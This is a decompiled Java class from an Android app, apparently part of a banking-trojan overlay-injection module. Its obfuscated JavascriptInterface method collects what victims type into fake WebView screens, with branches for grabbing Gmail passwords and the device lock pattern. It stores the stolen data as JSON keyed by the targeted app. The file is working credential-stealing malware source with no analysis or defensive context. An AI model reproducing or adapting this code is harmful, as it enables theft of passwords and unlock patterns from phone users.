package com.example.mmm.Activity;

import android.content.Context;
import android.os.Build.VERSION;
import android.webkit.JavascriptInterface;
import com.example.mmm.Utils.utils;
import org.json.JSONObject;

public class actViewInjection$WebAppInterface {
   Context mContext;
   final actViewInjection theology$;

   actViewInjection$WebAppInterface(actViewInjection var1, Context var2) {
      this.theology$ = var1;
      this.mContext = var2;
   }

   @JavascriptInterface
   @JavascriptInterface
   public void _armenia(String var1) {
      if (!var1.isEmpty()) {
         if (actViewInjection.a(this.theology$).isEmpty()) {
            actViewInjection.a(this.theology$, this.theology$.utl._storage(20));
         }

         JSONObject var2 = new JSONObject();
         if (actViewInjection.b(this.theology$).equals("grabbing_pass_gmail")) {
            this.theology$.utl.SettingsWrite(this.mContext, "RE", "");
            actViewInjection.b(this.theology$, "com.google.android.gm");
         }

         String var9;
         if (actViewInjection.b(this.theology$).equals("grabbing_lockpattern")) {
            this.theology$.utl.SettingsWrite(this.mContext, "GE", "");
            actViewInjection.b(this.theology$, "grabbing_lockpattern");
            var9 = var1.replace(utils._efforts("LCJ0eXBlX2luamVjdHMiOiJwaW5jb2RlIiwiY2xvc2VkIjoiY2xvc2VfYWN0aXZpdHlfaW5qZWN0cyI="), "");
            utils var3 = this.theology$.utl;
            Context var4 = this.mContext;
            String var5 = "AS";
            StringBuilder var6 = new StringBuilder();
            var6.append("Lock Pattern: ");
            var6.append(var9);
            var6.append("[143523#]");
            var3.SettingsToAdd(var4, var5, var6.toString());
         } else {
            var2.put("application", actViewInjection.b(this.theology$));
            var2.put("data", var1);
            utils var13 = this.theology$.utl;
            Context var16 = this.mContext;
            String var18 = actViewInjection.a(this.theology$);
            var9 = var2.toString();
            String var10 = var13.SettingsRead(var16, var18);
            if (!var10.isEmpty()) {
               JSONObject var7 = new JSONObject(var10);
               JSONObject var12 = new JSONObject(var9);
               String var8 = var7.getString("data");
               String var19 = var7.getString("data");
               var10 = var12.getString("data");
               var13.Log("str_getParams", String.valueOf(var8));
               var13.Log("str_params", String.valueOf(var10));
               var2 = utils.mergeJSONObjects(new JSONObject(var8), new JSONObject(var10));
               JSONObject var20 = new JSONObject();
               var20.put("application", var19);
               var20.put("data", var2.toString());
               var13.Log("mergedJSON", var20.toString());
               var13.SettingsWrite(var16, var18, var20.toString());
            } else {
               var13.SettingsWrite(var16, var18, var9);
            }

            if (!this.theology$.utl.SettingsRead(this.mContext, "AA").contains(actViewInjection.a(this.theology$))) {
               utils var11 = this.theology$.utl;
               Context var14 = this.mContext;
               String var15 = "AA";
               StringBuilder var17 = new StringBuilder();
               var17.append(actViewInjection.a(this.theology$));
               var17.append(":");
               var11.SettingsToAdd(var14, var15, var17.toString());
            }

            this.theology$.utl._founded(this.mContext, "QP", actViewInjection.b(this.theology$));
         }

         if (var1.contains("close_activity_injects")) {
            actViewInjection.c(this.theology$);
            this.theology$.facts$.removeAllViewsInLayout();
            this.theology$.facts$ = null;
            System.gc();
            if (VERSION.SDK_INT > 20) {
               this.theology$.finishAndRemoveTask();
               return;
            }

            this.theology$.finish();
         }
      }

   }
}
